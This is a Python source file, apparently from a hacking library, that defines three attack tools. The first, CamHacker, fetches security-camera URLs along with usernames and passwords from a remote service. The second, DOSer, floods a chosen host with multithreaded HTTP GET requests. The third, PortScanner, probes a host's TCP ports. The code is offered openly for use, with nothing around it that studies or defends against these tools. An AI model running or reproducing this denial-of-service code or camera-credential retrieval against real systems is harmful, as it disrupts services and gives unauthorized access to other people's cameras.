'''Copyright (c) 2016 Leon Li (leon@apolyse.com)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial
portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''

import socket, httplib, threading, time, urllib2
from queue import Queue

class CamHacker:
    '''Summons a security camera hacker from the cloud.
    '''

    def __init__(self, auth_key):
        self._repository = 'https://apolyse.com/hacklib/cams.php'
        self.auth_key = auth_key

    def _request(self, url):                 
        return urllib2.urlopen(url + '?key=' + self.auth_key).read()

    def hack(self):
        '''Returns cam URL and login details.
        '''
        data = self._request(self._repository)
        if '|' not in data:
            print 'Invalid key.'
            return
        data_list = data.split('|')
        print 'Security Cam URL: ' + data_list[0] + '\n' + 'Username: ' + data_list[1] + '\n' + 'Password: ' + data_list[2]
        return

class DOSer:
    '''Hits a host with packets from multiple threads.
    '''

    def __init__(self):
        self.target = '127.0.0.1'
        self.threads = 1
        self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
        self.start_time = 0
        self.time_length = 1

    def _attack(self, target):  
        #pid = os.fork()
        while int(time.time()) < self.start_time + self.time_length:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect((self.target, 80))
                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                s.send("Host: " + self.target  + "\r\n\r\n");  
                s.close()
            except: pass

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._attack(self.worker)
            self.q.task_done()

    def launch(self, host, duration, threads = 1, payload = 'default'):
        '''Launches threaded GET requests for (duration) seconds.
        '''
        self.target = host
        self.threads = threads
        self.start_time = int(time.time())
        self.time_length = duration
        if payload != 'default': self.payload = payload
        self.q = Queue()
        print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
        for x in range(threads):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()

        for worker in range(0, threads):
            self.q.put(worker)

        self.q.join()

class PortScanner:
    '''Scan an IP address using scan(host) with default port range of 1025
    '''

    def __init__(self):
        self.IP = '127.0.0.1'
        self.port_range = '1025'
        self.print_lock = threading.Lock()
        self.timeout = 1

    def _portscan(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        try:
            con = s.connect((self.IP,port))
            with self.print_lock:
                print 'Port', port, 'is open.'
            con.close()
        except:
            pass
        
    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._portscan(self.worker)
            self.q.task_done()

    def scan(self, IP, port_range = 1025, timeout = 1):
        '''Scans ports of an IP address. Use getIP() to find IP address of host.
        '''
        self.IP = IP
        self.port_range = port_range
        self.timeout = 1
        self.q = Queue()
        for x in range(30):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
            
        for worker in range(1, port_range):
            self.q.put(worker)

        self.q.join()
        
def getIP(host):
    return socket.gethostbyname(host)

